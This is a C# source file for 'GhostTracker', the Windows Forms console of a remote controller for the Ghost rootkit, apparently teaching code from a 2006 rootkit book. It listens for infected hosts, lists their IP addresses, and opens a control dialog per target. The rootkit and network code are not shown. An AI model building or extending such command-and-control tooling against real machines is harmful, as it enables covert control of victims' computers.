// GhostTracker.cs
// Copyright Ric Vieler, 2006
// This is a remote controller for the Ghost rootkit

using System;
using System.Drawing;
using System.Collections;
using System.ComponentModel;
using System.Windows.Forms;
using System.Data;
using System.Threading;

namespace GhostTracker
{
	/// <summary>
	/// Summary description for Form1.
	/// </summary>
	public class MainForm : System.Windows.Forms.Form
	{
		TargetController myTarget = null;
		Listen myListener = null;
		Thread myThread = null;
		private System.Windows.Forms.ListView targetListView;
		private System.Windows.Forms.ColumnHeader AddressHeader;
		private System.Windows.Forms.ColumnHeader InfoHeader;
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.Container components = null;

		public MainForm()
		{
			//
			// Required for Windows Form Designer support
			//
			InitializeComponent();

			// Create a thread object, passing in the 
			// Listen.Start method using a ThreadStart delegate.
			myListener = new Listen( this );
			myThread = new Thread( new ThreadStart( myListener.Start ) );

			// Start the listen thread.
			myThread.Start();
		}



		public void AddTarget( TargetController target, string targetAddress, string targetInfo )
		{
			// Save the TargetController class
			myTarget = target;

			// Add the target to the list view
			string[] columns = new string[3];
			// Add Item to the ListView control.
			columns[0] = targetAddress;
			columns[1] = targetInfo;
			columns[2] = "0";
			ListViewItem item = new ListViewItem( columns );
			this.targetListView.Items.Add( item );
			this.targetListView.EnsureVisible( this.targetListView.Items.Count - 1 );
		}

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		protected override void Dispose( bool disposing )
		{
			if( disposing )
			{
				if( myThread != null )
				{
					// Stop the listen thread.
					myListener.Stop();
					myThread.Abort();
					myThread.Join();
				}
				if (components != null) 
				{
					components.Dispose();
				}
			}
			base.Dispose( disposing );
		}

		#region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{
			this.targetListView = new System.Windows.Forms.ListView();
			this.AddressHeader = new System.Windows.Forms.ColumnHeader();
			this.InfoHeader = new System.Windows.Forms.ColumnHeader();
			this.SuspendLayout();
			// 
			// targetListView
			// 
			this.targetListView.BackColor = System.Drawing.SystemColors.ControlLight;
			this.targetListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
																							 this.AddressHeader,
																							 this.InfoHeader});
			this.targetListView.Dock = System.Windows.Forms.DockStyle.Fill;
			this.targetListView.FullRowSelect = true;
			this.targetListView.Location = new System.Drawing.Point(0, 0);
			this.targetListView.MultiSelect = false;
			this.targetListView.Name = "targetListView";
			this.targetListView.Size = new System.Drawing.Size(304, 109);
			this.targetListView.TabIndex = 0;
			this.targetListView.View = System.Windows.Forms.View.Details;
			this.targetListView.SelectedIndexChanged += new System.EventHandler(this.targetListView_SelectedIndexChanged);
			// 
			// AddressHeader
			// 
			this.AddressHeader.Text = "IPAddress";
			this.AddressHeader.Width = 81;
			// 
			// InfoHeader
			// 
			this.InfoHeader.Text = "Data";
			this.InfoHeader.Width = 219;
			// 
			// MainForm
			// 
			this.AutoScaleBaseSize = new System.Drawing.Size(5, 13);
			this.ClientSize = new System.Drawing.Size(304, 109);
			this.Controls.Add(this.targetListView);
			this.Location = new System.Drawing.Point(100, 100);
			this.Name = "MainForm";
			this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
			this.Text = "GhostTracker";
			this.ResumeLayout(false);

		}
		#endregion

		/// <summary>
		/// The main entry point for the application.
		/// </summary>
		[STAThread]
		static void Main() 
		{
			Application.Run(new MainForm());
		}

		public void Alert( IWin32Window baseControl, string message )
		{
			// TODO: There seems to be a bug in MessageBox.Show
			//       when using the IWin32Window overloads.
			//       Dialog "should" be center of App, not screen...
			if( baseControl == null )
				baseControl = this;
			MessageBox.Show( baseControl, message, "GhostTracker", 
				MessageBoxButtons.OK, MessageBoxIcon.Information);
		}

		private void targetListView_SelectedIndexChanged(object sender, System.EventArgs e)
		{
			string targetIP = "";

			// Get the selected item
			foreach( ListViewItem item in targetListView.Items )
			{
				targetIP = item.Text;
				if( item.Selected )
					break;
			}

			// Launch a controller for the target
			ControlForm controller = new ControlForm( targetIP, myTarget );
			controller.ShowDialog(this);
			// We're done once the target and controller are hooked up
		}
	}
}
